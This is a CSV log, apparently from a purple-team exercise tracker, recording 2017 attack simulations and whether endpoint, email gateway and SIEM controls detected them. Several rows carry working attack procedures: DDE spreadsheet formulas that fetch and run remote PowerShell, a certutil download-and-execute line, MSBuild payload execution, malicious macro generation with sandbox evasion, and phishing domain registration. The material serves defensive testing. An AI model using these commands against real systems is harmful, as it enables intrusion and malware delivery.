Enterprise Purple – 2017 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Customer Web App,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-01-03T15:27:04.930Z,1483457224930,2017-01-03T16:48:35.930Z,1483462115930,2017-01-03T17:34:42.930Z,1483464882930,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-01-22T00:50:51.930Z,1485046251930,2017-01-22T02:40:21.930Z,1485052821930,2017-01-22T03:39:04.930Z,1485056344930,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Detected,High,TBD,TBD,,,,,"EDR,Endpoint Protection",Donpachi,2017-01-22T11:54:30.930Z,1485086070930,2017-01-22T12:47:04.930Z,1485089224930,2017-01-22T13:05:11.930Z,1485090311930,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2017 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-01-22T14:15:38.930Z,1485094538930,2017-01-22T14:19:34.930Z,1485094774930,2017-01-22T15:40:56.930Z,1485099656930,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2017 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-01-22T04:17:10.930Z,1485058630930,2017-01-22T04:35:07.930Z,1485059707930,2017-01-22T05:31:04.930Z,1485063064930,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-01-22T09:38:33.930Z,1485077913930,2017-01-22T09:52:03.930Z,1485078723930,2017-01-22T11:51:51.930Z,1485085911930,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-01-22T06:09:16.930Z,1485065356930,2017-01-22T07:56:15.930Z,1485071775930,2017-01-22T08:24:19.930Z,1485073459930,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NET,T1087,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) EDR and/or SIEM rules are configured to detect use of native commands such as 'net' and modern PowerShell equivalents",,,"SIEM,EDR,Behavior Analytics",,2017-01-17T13:05:21.930Z,1484658321930,2017-01-17T14:52:00.930Z,1484664720930,2017-01-17T16:11:25.930Z,1484669485930,Security Risk Advisors,,"Leverage the builtin ""net"" command to perform queries against the Windows domain for common groups.","Domain Controllers:
net group ""Domain Controllers"" /domain

Domain Admins:
net group ""Domain Admins"" /domain

Administrators of the Domain:
net localgroup ""Administrators"" /domain",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - BloodHound,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,Yes,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Windows utilities used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics",,2017-01-17T19:09:35.930Z,1484680175930,2017-01-17T19:54:44.930Z,1484682884930,2017-01-17T21:37:06.930Z,1484689026930,Security Risk Advisors,,"Use Bloodhound/Sharphound to preform queries across the local domain.

- Domain Group Memberships
- Domain Trusts
- Local Admins
- Sessions","Using SharpHound.ps1:
Invoke-BloodHound

Using SharpHound.exe:
SharpHound.exe",,High,Low,Internal,High,,,,
Enterprise Purple – 2017 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NSlookup,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Large number of scripted nslookup commands potentially detected by EDR and/or SIEM solution, or behavioral monitoring tool",,,"SIEM,EDR",,2017-01-17T22:28:53.930Z,1484692133930,2017-01-17T23:32:15.930Z,1484695935930,2017-01-18T00:17:16.930Z,1484698636930,Security Risk Advisors,,"Leverage the builtin ""nslookup"" command to perform queries against the local DNS servers for specific server information.","DNS Servers: nslookup -type=NS [FQDN]
Domain Controllers: nslookup -type=SRV _ldap._tcp.[FQDN]",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - LDAP using PowerShell,T1059.001,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Legacy Windows and native PowerShell commands used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics",,2017-01-17T16:17:32.930Z,1484669852930,2017-01-17T17:16:37.930Z,1484673397930,2017-01-17T17:38:07.930Z,1484674687930,Security Risk Advisors,,Use PowerView v3 to perform queries against the Windows domain for common groups.,"List All Admins:
Get-DomainGroupMember -Identity ""Administrators"" -Domain [FQDN] -Recurse | select MemberName | fl",,High,Low,Internal,High,,,,PowerView
Enterprise Purple – 2017 Q1,Register Phishing Domains,Reconnaissance,Domain registration containing lexically close name,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2017-01-05T02:58:54.930Z,1483585134930,2017-01-05T03:25:55.930Z,1483586755930,2017-01-05T05:18:33.930Z,1483593513930,Security Risk Advisors,,Register domains containing names that resemble prominent web domains.,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2017 Q1,Register Phishing Domains,Reconnaissance,Domain registration containing brand keyword,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2017-01-04T22:20:24.930Z,1483568424930,2017-01-05T00:13:22.930Z,1483575202930,2017-01-05T01:16:54.930Z,1483579014930,Security Risk Advisors,,Register domains containing company keywords/branding,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2017 Q3,Register Phishing Domains,Reconnaissance,Domain registration containing brand keyword,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2017-08-04T21:29:29.460Z,1501882169460,2017-08-04T21:52:46.460Z,1501883566460,2017-08-04T23:41:06.460Z,1501890066460,Security Risk Advisors,,Register domains containing company keywords/branding,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2017 Q3,Register Phishing Domains,Reconnaissance,Domain registration containing lexically close name,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2017-08-05T00:57:53.460Z,1501894673460,2017-08-05T01:19:54.460Z,1501895994460,2017-08-05T02:05:32.460Z,1501898732460,Security Risk Advisors,,Register domains containing names that resemble prominent web domains.,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-08-11T12:11:53.460Z,1502453513460,2017-08-11T12:50:36.460Z,1502455836460,2017-08-11T14:20:19.460Z,1502461219460,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",Progear,2017-08-10T22:26:50.460Z,1502404010460,2017-08-11T00:16:54.460Z,1502410614460,2019-01-28T16:27:56.424Z,1548692876424,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-08-11T15:52:11.460Z,1502466731460,2017-08-11T16:09:33.460Z,1502467773460,2017-08-11T18:00:44.460Z,1502474444460,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-08-11T19:15:46.460Z,1502478946460,2017-08-11T19:53:48.460Z,1502481228460,2017-08-11T20:29:25.460Z,1502483365460,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,NotDetected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-08-11T07:39:09.460Z,1502437149460,2017-08-11T09:32:38.460Z,1502443958460,2019-01-29T08:26:34.817Z,1548750394817,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-08-10T11:38:41.460Z,1502365121460,2017-08-10T12:52:45.460Z,1502369565460,2017-08-10T14:01:00.460Z,1502373660460,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-08-10T19:16:58.460Z,1502392618460,2017-08-10T19:31:27.460Z,1502393487460,2017-08-10T20:49:02.460Z,1502398142460,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",Progear,2017-08-11T02:26:05.460Z,1502418365460,2017-08-11T02:47:48.460Z,1502419668460,2019-01-28T16:28:20.942Z,1548692900942,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-08-11T21:04:06.460Z,1502485446460,2017-08-11T22:37:45.460Z,1502491065460,2017-08-11T23:32:43.460Z,1502494363460,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-08-10T14:57:06.460Z,1502377026460,2017-08-10T15:27:05.460Z,1502378825460,2017-08-10T15:34:32.460Z,1502379272460,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-08-11T04:33:16.460Z,1502425996460,2017-08-11T06:02:43.460Z,1502431363460,2017-08-11T07:33:27.460Z,1502436807460,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-08-10T15:50:16.460Z,1502380216460,2017-08-10T16:01:57.460Z,1502380917460,2017-08-10T17:57:42.460Z,1502387862460,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,6 - Macro - WScript EXE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T22:30:49.460Z,1502058649460,2017-08-06T23:54:33.460Z,1502063673460,2017-08-07T00:11:59.460Z,1502064719460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-05T02:48:34.460Z,1501901314460,2017-08-05T03:47:06.460Z,1501904826460,2017-08-05T05:21:26.460Z,1501910486460,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T14:45:01.460Z,1501944301460,2017-08-05T16:12:17.460Z,1501949537460,2017-08-05T17:13:06.460Z,1501953186460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T10:13:10.460Z,1502014390460,2017-08-06T10:32:15.460Z,1502015535460,2017-08-06T12:04:23.460Z,1502021063460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T03:14:58.460Z,1502075698460,2017-08-07T04:45:12.460Z,1502081112460,2017-08-07T04:57:19.460Z,1502081839460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T17:50:35.460Z,1501955435460,2017-08-05T19:01:29.460Z,1501959689460,2017-08-05T20:57:12.460Z,1501966632460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,18 - Encrypted Archive - Macro,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T21:34:54.460Z,1501968894460,2017-08-05T22:21:27.460Z,1501971687460,2017-08-05T23:09:03.460Z,1501974543460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,13 - DDE - Exe,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-07T12:21:07.460Z,1502108467460,2017-08-07T13:46:14.460Z,1502113574460,2017-08-07T13:47:08.460Z,1502113628460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,2 - Macro - CobaltStrike Standard (MMG),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-05T06:16:15.460Z,1501913775460,2017-08-05T08:10:11.460Z,1501920611460,2017-08-05T09:57:03.460Z,1501927023460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-07T05:11:06.460Z,1502082666460,2017-08-07T05:59:37.460Z,1502085577460,2017-08-07T07:36:55.460Z,1502091415460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,11 - DDE - PowerShell,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T10:30:31.460Z,1501929031460,2017-08-05T11:43:35.460Z,1501933415460,2017-08-05T13:30:31.460Z,1501939831460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,22 - Link Inside Office Document,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T07:18:11.460Z,1502003891460,2017-08-06T08:23:28.460Z,1502007808460,2017-08-06T09:48:21.460Z,1502012901460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T14:11:25.460Z,1502115085460,2017-08-07T14:46:35.460Z,1502117195460,2017-08-07T16:20:42.460Z,1502122842460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T13:03:01.460Z,1502024581460,2017-08-06T14:11:08.460Z,1502028668460,2017-08-06T15:32:14.460Z,1502033534460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T00:12:08.460Z,1501978328460,2017-08-06T00:41:25.460Z,1501980085460,2017-08-06T00:54:37.460Z,1501980877460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,7 - Macro - WScript PowerShell XOR,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T01:07:15.460Z,1502068035460,2017-08-07T01:31:31.460Z,1502069491460,2017-08-07T01:35:43.460Z,1502069743460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T09:21:33.460Z,1502097693460,2017-08-07T11:07:51.460Z,1502104071460,2017-08-07T11:55:22.460Z,1502106922460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T18:38:47.460Z,1502044727460,2017-08-06T20:24:36.460Z,1502051076460,2017-08-06T21:31:49.460Z,1502055109460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T03:25:47.460Z,1501989947460,2017-08-06T04:06:26.460Z,1501992386460,2017-08-06T05:38:30.460Z,1501997910460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T17:28:33.460Z,1502040513460,2017-08-06T17:38:25.460Z,1502041105460,2017-08-06T18:32:12.460Z,1502044332460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-07T16:25:46.460Z,1502123146460,2017-08-07T17:10:33.460Z,1502125833460,2017-08-07T19:06:04.460Z,1502132764460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

